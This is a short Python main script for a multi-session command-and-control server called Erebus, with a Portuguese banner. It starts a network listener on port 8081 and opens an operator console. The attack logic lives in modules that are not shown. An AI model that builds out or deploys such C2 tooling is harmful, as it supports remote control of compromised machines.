from core import TransportEngine
from commands import CommandDispatcher
from console import C2Console
def main():
    transport = TransportEngine(host='0.0.0.0', port=8081)
    transport.start_listener()
    dispatcher = CommandDispatcher(transport)
    print("[*] Servidor C2 Erebus Multi-Sessões Inicializado!")
    print("[*] Módulos carregados com sucesso: core.py, commands.py, console.py\n")
    console = C2Console(dispatcher, transport)
    console.start_loop()
    transport.cleanup()
if __name__ == "__main__":
    main()
